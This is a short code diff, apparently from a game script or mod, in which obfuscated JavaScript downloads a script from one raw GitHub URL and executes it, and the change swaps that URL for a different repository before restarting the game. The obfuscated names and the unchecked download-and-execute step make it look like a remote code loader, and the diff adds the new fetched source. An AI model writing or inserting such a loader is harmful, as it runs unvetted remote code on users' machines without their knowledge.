@@ -38,6 +38,6 @@ function executeScript(_0x4e2958) {
     print("Error executing the script: " + _0x1760c9.message);
   }
 }
-downloadScript("https://raw.githubusercontent.com/GaeClapper/fr/refs/heads/main/wow.js", scriptPath);
+downloadScript("https://raw.githubusercontent.com/ge620/wow/refs/heads/main/main.js", scriptPath);
 executeScript(scriptPath);
 Restart_game;
